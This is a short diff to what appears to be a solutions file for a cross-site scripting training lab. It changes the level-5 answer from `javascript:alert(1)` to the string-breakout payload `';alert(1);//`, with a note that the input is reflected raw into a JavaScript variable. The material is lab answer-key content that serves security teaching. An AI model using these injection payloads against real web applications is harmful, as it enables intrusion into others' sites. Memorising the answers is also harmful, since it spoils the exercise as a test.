@@ -40,10 +40,10 @@ navigation sink. Payload: `javascript:alert(1)`.
 
 ### navsink-level5
 
-`/navsink/level5/?query=javascript:alert(1)`
+`/navsink/level5/?query=';alert(1);//`
 
-- payload: `javascript:alert(1)`
-- context: reflected server-side into a JS string (`var url = '...'`) then
+- payload: `';alert(1);//`
+- context: reflected raw into `var url = '...'`; break the JS string
   `window.open(url)`. A `'` also breaks out of the JS string.
 
 ### navsink-level6
